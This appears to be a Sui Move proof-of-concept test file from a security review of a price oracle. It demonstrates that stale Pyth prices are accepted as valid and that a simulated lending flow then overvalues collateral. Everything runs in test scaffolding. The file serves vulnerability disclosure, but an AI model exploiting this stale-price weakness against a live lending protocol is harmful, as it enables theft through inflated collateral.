#[test_only]
module oracle::poc_test {
    use sui::test_scenario;
    use sui::clock::{Self, Clock};
    use sui::math;

    use oracle::oracle::{Self, PriceOracle};
    use oracle::config::{Self, OracleConfig};
    use oracle::oracle_global::{Self as global};
    use oracle::oracle_pro;
    use oracle::oracle_lib::{Self as lib};

    use std::vector::{Self};

    const OWNER: address = @0xA;

    // Validate that stale prices are accepted through the unsafe Pyth path.
    #[test]
    public fun test_stale_price_accepted_via_unsafe_path() {
        let _scenario = test_scenario::begin(OWNER);
        let scenario = &mut _scenario;
        let _clock = clock::create_for_testing(test_scenario::ctx(scenario));

        {
            global::init_protocol(scenario);
        };

        test_scenario::next_tx(scenario, OWNER);

        {
            let price_oracle = test_scenario::take_shared<PriceOracle>(scenario);
            let oracle_config = test_scenario::take_shared<OracleConfig>(scenario);

            let feeds = config::get_vec_feeds(&oracle_config);
            let feed_id = *vector::borrow(&feeds, 0);

            let current_time: u64 = 100_000;
            let stale_timestamp: u64 = current_time - 50_000;

            let stale_price: u256 = 9_000000;

            clock::set_for_testing(&mut _clock, current_time);

            lib::printf(b"=== stale price accepted via unsafe oracle path ===");

            oracle_pro::update_single_price_for_testing(
                &_clock,
                &mut oracle_config,
                &mut price_oracle,
                stale_price,
                stale_timestamp,
                stale_price,
                current_time,
                feed_id,
            );

            let (valid, committed_price, _) =
                oracle::get_token_price(&_clock, &price_oracle, 0);

            lib::printf(b"[RESULT] valid =");
            lib::print(&valid);

            lib::printf(b"[RESULT] committed_price =");
            lib::print(&committed_price);

            assert!(valid == true, 0);
            assert!(committed_price == stale_price, 1);

            test_scenario::return_shared(price_oracle);
            test_scenario::return_shared(oracle_config);
        };

        clock::destroy_for_testing(_clock);
        test_scenario::end(_scenario);
    }

    // Simulate lending_core collateral valuation flow.
    fun simulated_lending_core_calculate_value(
        clock: &Clock,
        oracle: &PriceOracle,
        amount: u256,
        oracle_id: u8
    ): u256 {
        let (is_valid, price, decimal) =
            oracle::get_token_price(clock, oracle, oracle_id);

        assert!(is_valid, 999);

        amount * price / (math::pow(10, decimal) as u256)
    }

    // Demonstrate collateral inflation caused by stale oracle prices.
    #[test]
    public fun test_lending_core_collateral_inflation() {
        let _scenario = test_scenario::begin(OWNER);
        let scenario = &mut _scenario;
        let _clock = clock::create_for_testing(test_scenario::ctx(scenario));

        {
            global::init_protocol(scenario);
        };

        test_scenario::next_tx(scenario, OWNER);

        {
            let price_oracle = test_scenario::take_shared<PriceOracle>(scenario);
            let oracle_config = test_scenario::take_shared<OracleConfig>(scenario);

            let feeds = config::get_vec_feeds(&oracle_config);
            let feed_id = *vector::borrow(&feeds, 0);

            let current_time: u64 = 155_000;
            let stale_timestamp: u64 = current_time - 35_000;

            let stale_price: u256 = 10_000000;
            let real_market_price: u256 = 7_000000;

            let collateral_amount: u256 = 100_000_000_000;

            clock::set_for_testing(&mut _clock, current_time);

            lib::printf(b"=== lending collateral valuation using stale price ===");

            lib::printf(b"[SETUP] stale oracle price = 10");
            lib::printf(b"[SETUP] real market price = 7");

            oracle_pro::update_single_price_for_testing(
                &_clock,
                &mut oracle_config,
                &mut price_oracle,
                stale_price,
                stale_timestamp,
                stale_price,
                current_time,
                feed_id,
            );

            let inflated_value = simulated_lending_core_calculate_value(
                &_clock,
                &price_oracle,
                collateral_amount,
                0
            );

            let expected_real_value =
                inflated_value * real_market_price / stale_price;

            lib::printf(b"[RESULT] collateral value from oracle =");
            lib::print(&inflated_value);

            lib::printf(b"[RESULT] expected market value =");
            lib::print(&expected_real_value);

            assert!(inflated_value > expected_real_value, 0);

            test_scenario::return_shared(price_oracle);
            test_scenario::return_shared(oracle_config);
        };

        clock::destroy_for_testing(_clock);
        test_scenario::end(_scenario);
    }
}
